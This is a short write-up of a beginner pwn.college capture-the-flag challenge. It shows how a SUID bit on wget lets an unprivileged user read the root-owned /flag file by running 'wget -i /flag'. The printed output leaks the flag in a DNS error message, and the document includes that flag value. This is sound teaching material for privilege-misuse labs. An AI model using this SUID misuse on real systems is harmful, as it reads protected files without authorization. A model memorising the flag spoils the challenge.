---
layout: page
title: "Challenge Name: wget"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/wget`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/wget
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/wget
```

- The `s` in `-rws` indicates it's a SUID binary.
- `wget` runs with **root privileges**.

## 🚀 Exploitation

The `wget` -i option downloads multiple files listed in given file

```bash
wget -i /flag
```

Output:
```
--2025-07-16 14:25:23--  http://pwn.college%7Be7-8uxknyps3obgq_phy7hh3cny.djtoxwsm0izmyezw%7D/
Resolving pwn.college{e7-8uxknyps3obgq_phy7hh3cny.djtoxwsm0izmyezw} (pwn.college{e7-8uxknyps3obgq_phy7hh3cny.djtoxwsm0izmyezw})... failed: Name or service not known.
wget: unable to resolve host address ‘pwn.college{e7-8uxknyps3obgq_phy7hh3cny.djtoxwsm0izmyezw}’
```
